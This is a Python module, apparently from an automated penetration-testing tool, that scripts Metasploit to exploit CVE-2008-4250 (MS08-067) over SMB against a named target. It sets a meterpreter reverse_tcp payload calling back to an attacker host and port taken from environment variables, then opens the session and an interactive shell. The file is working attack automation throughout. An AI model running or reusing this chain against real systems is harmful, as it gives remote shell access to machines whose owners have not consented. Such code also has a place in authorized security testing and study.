
import os
import re
import time
import subprocess
from dotenv import load_dotenv
# global variables
import config

################################################################################
# Envionment variable imports (API Keys etc)
################################################################################

load_dotenv()
MSF_LHOST = os.getenv('MSF_LHOST')
MSF_LPORT = os.getenv('MSF_LPORT')


################################################################################
# Initial access exploits
################################################################################

class InitialAccess(object):
    """
    Defines a collection initial access exploits
    """

    def exploit_cve_2008_4250(self, target_name):
        """
        Create a reverse shell with target
        """
        cmd = "use exploit/windows/smb/ms08_067_netapi"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set PAYLOAD windows/meterpreter/reverse_tcp"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set TARGET 6"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set RHOST " + config.TARGETS[target_name].ip
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set LHOST " + MSF_LHOST
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set LPORT " + MSF_LPORT
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "exploit"
        config.MSFCONSOLE.set_shell()
        config.MSFCONSOLE.callback(cmd, verbose=False)
        # time.sleep(1)
        cmd = "sessions -i 1"
        config.MSFCONSOLE.callback(cmd, verbose=False)
        # time.sleep(1)
        cmd = "shell"
        config.MSFCONSOLE.callback(cmd, verbose=True)
        # time.sleep(2)
